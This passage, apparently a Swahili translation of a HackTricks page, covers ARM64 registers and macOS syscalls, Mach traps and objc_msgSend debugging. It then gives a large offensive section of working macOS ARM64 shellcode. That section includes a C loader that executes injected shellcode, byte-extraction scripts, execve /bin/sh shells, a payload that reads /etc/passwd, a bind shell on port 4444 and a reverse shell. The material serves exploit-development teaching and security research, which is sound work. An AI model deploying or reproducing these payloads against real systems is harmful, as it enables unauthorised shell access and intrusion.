- Bendera **`Q`**: Inapangwa kuwa 1 kila wakati **saturation ya integer inapotokea** wakati wa utekelezaji wa amri maalum ya hesabu ya saturation. Mara inapowekwa kuwa **`1`**, itahifadhi thamani hiyo hadi iwekwe kwa mikono kuwa 0. Zaidi ya hayo, hakuna amri inayokagua thamani yake kwa njia isiyo ya moja kwa moja, inapaswa kufanywa kwa kusoma kwa mikono.
- Bendera **`GE`** (Kubwa kuliko au sawa): Inatumika katika operesheni za SIMD (Single Instruction, Multiple Data), kama vile "kuongeza kwa pamoja" na "kupunguza kwa pamoja". Operesheni hizi zinaruhusu kusindika vidokezo vingi vya data katika amri moja.

Kwa mfano, amri **`UADD8`** **inaongeza jozi nne za bytes** (kutoka kwa operandi mbili za 32-bit) kwa pamoja na kuhifadhi matokeo katika register ya 32-bit. Kisha **inaweka bendera za `GE` katika `APSR`** kulingana na matokeo haya. Kila bendera ya GE inahusiana na moja ya nyongeza za byte, ikionyesha ikiwa nyongeza ya jozi hiyo ya byte **ilivuka**.

Amri **`SEL`** inatumia bendera hizi za GE kufanya vitendo vya masharti.

#### Execution State Registers

- Bits **`J`** na **`T`**: **`J`** inapaswa kuwa 0 na ikiwa **`T`** ni 0 seti ya amri A32 inatumika, na ikiwa ni 1, T32 inatumika.
- **IT Block State Register** (`ITSTATE`): Hizi ni bits kutoka 10-15 na 25-26. Zinahifadhi hali za masharti kwa amri ndani ya kundi lililo na prefiksi **`IT`**.
- Bit **`E`**: Inaonyesha **endianness**.
- **Mode and Exception Mask Bits** (0-4): Zinabainisha hali ya sasa ya utekelezaji. **Ya 5** inaonyesha ikiwa programu inafanya kazi kama 32bit (1) au 64bit (0). Nyingine 4 zinaonyesha **hali ya makosa inayotumika sasa** (wakati makosa yanatokea na yanashughulikiwa). Nambari iliyowekwa **inaonyesha kipaumbele cha sasa** ikiwa makosa mengine yanachochewa wakati huu unashughulikiwa.

<figure><img src="../../../images/image (1200).png" alt=""><figcaption></figcaption></figure>

- **`AIF`**: Makosa fulani yanaweza kuzuiliwa kwa kutumia bits **`A`**, `I`, `F`. Ikiwa **`A`** ni 1 inamaanisha **kuondolewa kwa asynchronous** kutachochewa. **`I`** inasanidiwa kujibu **Interrupts Requests** (IRQs) za vifaa vya nje. na F inahusiana na **Fast Interrupt Requests** (FIRs).

## macOS

### BSD syscalls

Angalia [**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master). BSD syscalls zitakuwa na **x16 > 0**.

### Mach Traps

Angalia katika [**syscall_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall_sw.c.auto.html) `mach_trap_table` na katika [**mach_traps.h**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/mach/mach_traps.h) prototypes. Nambari ya mex ya Mach traps ni `MACH_TRAP_TABLE_COUNT` = 128. Mach traps zitakuwa na **x16 < 0**, hivyo unahitaji kuita nambari kutoka orodha ya awali kwa **minus**: **`_kernelrpc_mach_vm_allocate_trap`** ni **`-10`**.

Unaweza pia kuangalia **`libsystem_kernel.dylib`** katika disassembler ili kupata jinsi ya kuita hizi (na BSD) syscalls:
```bash
# macOS
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```
Kumbuka kwamba **Ida** na **Ghidra** zinaweza pia ku-decompile **dylibs maalum** kutoka kwenye cache kwa kupitisha tu cache hiyo.

> [!TIP]
> Wakati mwingine ni rahisi kuangalia **code iliyodecompiled** kutoka **`libsystem_kernel.dylib`** **kuliko** kuangalia **source code** kwa sababu code ya syscalls kadhaa (BSD na Mach) inazalishwa kupitia scripts (angalia maoni katika source code) wakati katika dylib unaweza kupata kile kinachoitwa.

### machdep calls

XNU inasaidia aina nyingine ya calls inayoitwa machine dependent. Nambari za calls hizi zinategemea usanifu na wala calls au nambari hazihakikishiwi kubaki kuwa thabiti.

### comm page

Hii ni ukurasa wa kumbukumbu ya mmiliki wa kernel ambao umewekwa kwenye anwani ya kila mchakato wa mtumiaji. Imepangwa kufanya mpito kutoka kwa hali ya mtumiaji hadi nafasi ya kernel kuwa haraka kuliko kutumia syscalls kwa huduma za kernel ambazo zinatumika sana kiasi kwamba mpito huu ungekuwa usio na ufanisi.

Kwa mfano, wito wa `gettimeofdate` unasoma thamani ya `timeval` moja kwa moja kutoka kwenye comm page.

### objc_msgSend

Ni kawaida sana kupata kazi hii ikitumika katika programu za Objective-C au Swift. Kazi hii inaruhusu kuita njia ya kitu cha objective-C.

Parameta ([maelezo zaidi katika docs](https://developer.apple.com/documentation/objectivec/1456712-objc_msgsend)):

- x0: self -> Pointer kwa mfano
- x1: op -> Mchoro wa njia
- x2... -> Mabaki ya hoja za njia iliyoitwa

Hivyo, ikiwa utaweka breakpoint kabla ya tawi la kazi hii, unaweza kwa urahisi kupata kile kinachoitwa katika lldb (katika mfano huu, kitu kinaita kitu kutoka `NSConcreteTask` ambacho kitakimbiza amri):
```bash
# Right in the line were objc_msgSend will be called
(lldb) po $x0
<NSConcreteTask: 0x1052308e0>

(lldb) x/s $x1
0x1736d3a6e: "launch"

(lldb) po [$x0 launchPath]
/bin/sh

(lldb) po [$x0 arguments]
<__NSArrayI 0x1736801e0>(
-c,
whoami
)
```
> [!TIP]
> Kuweka variable ya env **`NSObjCMessageLoggingEnabled=1`** inawezekana kuandika wakati kazi hii inaitwa katika faili kama `/tmp/msgSends-pid`.
>
> Zaidi ya hayo, kuweka **`OBJC_HELP=1`** na kuita binary yoyote unaweza kuona variable nyingine za mazingira ambazo unaweza kutumia ku **log** wakati vitendo fulani vya Objc-C vinatokea.

Wakati kazi hii inaitwa, inahitajika kupata njia iliyoitwa ya mfano ulioonyeshwa, kwa hili utafutaji tofauti hufanywa:

- Fanya utafutaji wa cache wa matumaini:
- Ikiwa ni mafanikio, imekamilika
- Pata runtimeLock (kusoma)
- Ikiwa (realize && !cls->realized) realize class
- Ikiwa (initialize && !cls->initialized) initialize class
- Jaribu cache ya darasa lenyewe:
- Ikiwa ni mafanikio, imekamilika
- Jaribu orodha ya mbinu za darasa:
- Ikiwa imepatikana, jaza cache na umalize
- Jaribu cache ya darasa la mzazi:
- Ikiwa ni mafanikio, imekamilika
- Jaribu orodha ya mbinu za darasa la mzazi:
- Ikiwa imepatikana, jaza cache na umalize
- Ikiwa (resolver) jaribu mtafutaji wa mbinu, na rudia kutoka utafutaji wa darasa
- Ikiwa bado hapa (= kila kitu kingine kimefeli) jaribu forwarder

### Shellcodes

Ili kukusanya:
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
Ili kutoa bytes:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
Kwa macOS mpya:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/fc0742e9ebaf67c6a50f4c38d59459596e0a6c5d/helper/extract.sh
for s in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n $s | awk '{for (i = 7; i > 0; i -= 2) {printf "\\x" substr($0, i, 2)}}'
done
```
<details>

<summary>Code ya C ya kujaribu shellcode</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

Imechukuliwa kutoka [**hapa**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s) na kufafanuliwa.

{{#tabs}}
{{#tab name="with adr"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}

{{#tab name="with stack"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
{{#endtab}}

{{#tab name="with adr for linux"}}
```armasm
; From https://8ksec.io/arm64-reversing-and-exploitation-part-5-writing-shellcode-8ksec-blogs/
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}
{{#endtabs}}

#### Soma na cat

Lengo ni kutekeleza `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`, hivyo hoja ya pili (x1) ni array ya param (ambayo katika kumbukumbu inamaanisha stack ya anwani).
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### Wito amri na sh kutoka kwa fork ili mchakato mkuu usiuwe.
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### Bind shell

Bind shell kutoka [https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s) katika **port 4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### Reverse shell

Kutoka [https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s), revshell kwa **127.0.0.1:4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
{{#include ../../../banners/hacktricks-training.md}}
